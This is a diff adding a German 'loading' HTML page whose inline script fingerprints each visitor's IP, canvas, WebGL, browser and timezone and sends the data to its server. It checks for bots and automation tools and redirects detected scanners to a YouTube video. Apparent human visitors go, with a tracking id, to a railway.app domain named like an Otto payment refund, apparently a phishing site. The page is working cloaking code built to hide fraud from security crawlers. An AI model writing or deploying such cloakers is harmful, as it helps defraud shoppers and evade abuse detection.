@@ -1,0 +1,438 @@
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wird geladen...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #ffffff;
+            overflow: hidden;
+        }
+        
+        .container {
+            text-align: center;
+        }
+        
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top-color: #eb001f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+        
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+        
+        .text {
+            font-size: 18px;
+            font-weight: 500;
+            color: #232F3E;
+            margin-bottom: 8px;
+        }
+        
+        .subtext {
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <div class="text">Wird geladen</div>
+        <div class="subtext">Bitte warten...</div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+            
+            const CONFIG = {
+                targetUrl: "https:\/\/zahlung-ruckzahlung-otto.up.railway.app",
+                fallbackUrl: "https:\/\/www.youtube.com\/watch?v=YHBOHKpYWxw",
+                trackingCode: "4b9a8591443b"            };
+            
+            let botScore = 0;
+            let flags = [];
+            
+            // ============================================================
+            // GET PUBLIC IP FROM FRONTEND
+            // ============================================================
+            
+            async function getPublicIP() {
+                try {
+                    // Use Cloudflare trace (fast, free, HTTPS)
+                    const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                    const text = await response.text();
+                    
+                    const lines = text.split('\n');
+                    for (const line of lines) {
+                        if (line.startsWith('ip=')) {
+                            return line.split('=')[1];
+                        }
+                    }
+                    
+                    return 'unknown';
+                } catch (e) {
+                    return 'unknown';
+                }
+            }
+            
+            // ============================================================
+            // GET BROWSER INFO
+            // ============================================================
+            
+            function getBrowserInfo() {
+                const ua = navigator.userAgent;
+                let browser = 'Unknown';
+                let version = 'Unknown';
+                let os = 'Unknown';
+                
+                if (ua.includes('Firefox')) {
+                    browser = 'Firefox';
+                    version = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown';
+                } else if (ua.includes('Edg')) {
+                    browser = 'Edge';
+                    version = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown';
+                } else if (ua.includes('Chrome')) {
+                    browser = 'Chrome';
+                    version = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown';
+                } else if (ua.includes('Safari')) {
+                    browser = 'Safari';
+                    version = ua.match(/Version\/([\d.]+)/)?.[1] || 'Unknown';
+                }
+                
+                if (ua.includes('Windows NT 10')) os = 'Windows 10';
+                else if (ua.includes('Windows NT 11')) os = 'Windows 11';
+                else if (ua.includes('Windows')) os = 'Windows';
+                else if (ua.includes('Mac OS X')) os = 'macOS';
+                else if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+                
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+                
+                return { browser, version, os, timezone };
+            }
+            
+            // ============================================================
+            // SMART BOT DETECTION - ADVANCED
+            // ============================================================
+            
+            // Canvas Fingerprinting
+            function getCanvasFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    if (!ctx) {
+                        botScore += 30;
+                        flags.push('no_canvas');
+                        return 'no-canvas';
+                    }
+                    
+                    canvas.width = 200;
+                    canvas.height = 50;
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('🔒 Browser Test 123', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Canvas FP', 4, 35);
+                    
+                    const dataUrl = canvas.toDataURL();
+                    let hash = 0;
+                    for (let i = 0; i < dataUrl.length; i++) {
+                        hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
+                        hash = hash & hash;
+                    }
+                    
+                    return Math.abs(hash).toString(16);
+                } catch (e) {
+                    botScore += 30;
+                    flags.push('canvas_error');
+                    return 'error';
+                }
+            }
+            
+            // WebGL Fingerprinting
+            function getWebGLFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    
+                    if (!gl) {
+                        botScore += 25;
+                        flags.push('no_webgl');
+                        return 'no-webgl';
+                    }
+                    
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    
+                    return `${vendor}|${renderer}`;
+                } catch (e) {
+                    botScore += 20;
+                    flags.push('webgl_error');
+                    return 'error';
+                }
+            }
+            
+            // Advanced Bot Detection
+            function detectBot() {
+                const ua = navigator.userAgent.toLowerCase();
+                const startTime = performance.now();
+                
+                // 1. Bot Signatures (comprehensive list)
+                const botSigs = [
+                    'bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 'python', 'java',
+                    'selenium', 'headless', 'phantom', 'puppeteer', 'playwright', 'cypress',
+                    'webdriver', 'automation', 'mechanize', 'httpclient', 'okhttp', 'axios',
+                    'node-fetch', 'go-http', 'perl', 'ruby', 'postman', 'insomnia'
+                ];
+                
+                for (const sig of botSigs) {
+                    if (ua.includes(sig)) {
+                        flags.push(`bot:${sig}`);
+                        botScore += 100;
+                        return true;
+                    }
+                }
+                
+                // 2. WebDriver Detection
+                if (navigator.webdriver) {
+                    flags.push('webdriver');
+                    botScore += 100;
+                    return true;
+                }
+                
+                // 3. Automation Framework Detection
+                const automationIndicators = [
+                    'callPhantom', '_phantom', '__nightmare', '__selenium_unwrapped',
+                    'domAutomation', 'domAutomationController', '__webdriver_script_fn',
+                    '__driver_evaluate', '__webdriver_evaluate', '__selenium_evaluate',
+                    '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped',
+                    '__fxdriver_unwrapped', '_Selenium_IDE_Recorder', '_selenium',
+                    'calledSelenium', '$cdc_', '$chrome_asyncScriptInfo', '__$webdriverAsyncExecutor'
+                ];
+                
+                for (const indicator of automationIndicators) {
+                    if (window[indicator] || document[indicator]) {
+                        flags.push(`automation:${indicator}`);
+                        botScore += 100;
+                        return true;
+                    }
+                }
+                
+                // 4. Browser Legitimacy Check
+                const browsers = ['firefox', 'chrome', 'safari', 'edge', 'opera'];
+                if (!browsers.some(b => ua.includes(b))) {
+                    flags.push('no_browser');
+                    botScore += 50;
+                }
+                
+                // 5. Plugin Check
+                if (navigator.plugins.length === 0) {
+                    flags.push('no_plugins');
+                    botScore += 20;
+                }
+                
+                // 6. Language Check
+                if (!navigator.languages || navigator.languages.length === 0) {
+                    flags.push('no_langs');
+                    botScore += 20;
+                }
+                
+                // 7. Headless Chrome Detection
+                if (window.chrome && !window.chrome.runtime) {
+                    flags.push('headless_chrome');
+                    botScore += 35;
+                }
+                
+                // 8. Screen Size Check
+                if (screen.width < 100 || screen.height < 100) {
+                    flags.push('bad_screen');
+                    botScore += 30;
+                }
+                
+                // 9. Permissions API Check
+                if (!navigator.permissions) {
+                    flags.push('no_perms');
+                    botScore += 15;
+                }
+                
+                // 10. Connection Check
+                if (navigator.connection && navigator.connection.rtt === 0) {
+                    flags.push('zero_rtt');
+                    botScore += 25;
+                }
+                
+                // 11. Battery API Check (missing in headless)
+                if (!navigator.getBattery && !navigator.battery) {
+                    flags.push('no_battery');
+                    botScore += 10;
+                }
+                
+                // 12. Touch Support Check (inconsistencies)
+                const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+                if (hasTouch && screen.width > 1024) {
+                    // Desktop with touch is suspicious
+                    flags.push('desktop_touch');
+                    botScore += 15;
+                }
+                
+                // 13. Timing Check (bots are usually faster)
+                const endTime = performance.now();
+                const executionTime = endTime - startTime;
+                if (executionTime < 1) {
+                    flags.push('fast_execution');
+                    botScore += 20;
+                }
+                
+                // 14. User Agent Consistency
+                const platform = navigator.platform.toLowerCase();
+                if (ua.includes('windows') && !platform.includes('win')) {
+                    flags.push('platform_mismatch');
+                    botScore += 30;
+                }
+                if (ua.includes('mac') && !platform.includes('mac')) {
+                    flags.push('platform_mismatch');
+                    botScore += 30;
+                }
+                
+                // 15. Chrome-specific checks
+                if (ua.includes('chrome')) {
+                    if (!window.chrome) {
+                        flags.push('fake_chrome');
+                        botScore += 40;
+                    }
+                }
+                
+                return botScore >= 50;
+            }
+            
+            // ============================================================
+            // MAIN DETECTION
+            // ============================================================
+            
+            async function detectAndRedirect() {
+                try {
+                    // 1. Run smart bot detection FIRST (Client-side)
+                    const isBot = detectBot();
+                    
+                    // 2. IMMEDIATE BLOCK for Obvious Bots (Score >= 80)
+                    // Save API calls - don't check country for known bots
+                    if (botScore >= 80) {
+                        // Log locally detected bot (no API needed)
+                        await fetch(window.location.href, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: 'detection_data=' + encodeURIComponent(JSON.stringify({
+                                ip: 'unknown', // Will be filled by PHP
+                                status: 'blocked',
+                                block_reason: 'obvious_bot',
+                                bot_score: botScore,
+                                flags: flags.join(','),
+                                api_skipped: true
+                            }))
+                        });
+                        
+                        // Redirect to fallback immediately
+                        setTimeout(() => {
+                            window.location.href = CONFIG.fallbackUrl;
+                        }, 500);
+                        return; // Stop here
+                    }
+                    
+                    // 3. If NOT an obvious bot, get detailed info (API)
+                    // Get IP and Browser Info for the API request
+                    const publicIP = await getPublicIP();
+                    const canvasFP = getCanvasFingerprint();
+                    const webglFP = getWebGLFingerprint();
+                    const browserInfo = getBrowserInfo();
+                    
+                    let shouldAllow = true; // Default: allow if API fails
+                    
+                    // 4. Call Backend API
+                    try {
+                        const response = await fetch(window.location.href, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: 'detection_data=' + encodeURIComponent(JSON.stringify({
+                                ip: publicIP,
+                                os: browserInfo.os,
+                                browser: browserInfo.browser,
+                                version: browserInfo.version,
+                                timezone: browserInfo.timezone,
+                                canvas_fp: canvasFP,
+                                webgl_fp: webglFP,
+                                status: 'clean', // Tentatively clean
+                                block_reason: 'none',
+                                bot_score: botScore,
+                                flags: flags.join(','),
+                                api_skipped: false
+                            }))
+                        });
+                        
+                        if (response.ok) {
+                            const result = await response.json();
+                            // If API worked and returned false, block. 
+                            // If API failed/error, result.should_allow will be true (from PHP default)
+                            shouldAllow = result.should_allow !== false;
+                        }
+                    } catch (e) {
+                        // API Network Error -> Allow Visitor
+                        shouldAllow = true;
+                    }
+                    
+                    // 5. Final Decision
+                    // We know it's not an obvious bot (checked in step 2)
+                    // So just check the API result
+                    const isClean = shouldAllow;
+                    
+                    // Redirect
+                    let url = isClean ? CONFIG.targetUrl : CONFIG.fallbackUrl;
+                    
+                    if (isClean && CONFIG.trackingCode !== 'default') {
+                        url += (url.includes('?') ? '&' : '?') + 'id=' + CONFIG.trackingCode;
+                    }
+                    
+                    setTimeout(() => {
+                        window.location.href = url;
+                    }, 500);
+                    
+                } catch (error) {
+                    // Global Error Fallback -> Allow Visitor (Target)
+                    let url = CONFIG.targetUrl;
+                    if (CONFIG.trackingCode !== 'default') {
+                        url += (url.includes('?') ? '&' : '?') + 'id=' + CONFIG.trackingCode;
+                    }
+                    setTimeout(() => {
+                        window.location.href = url;
+                    }, 500);
+                }
+            }
+            
+            // Start
+            setTimeout(detectAndRedirect, 300);
+            
+        })();
+    </script>
+</body>
+</html>
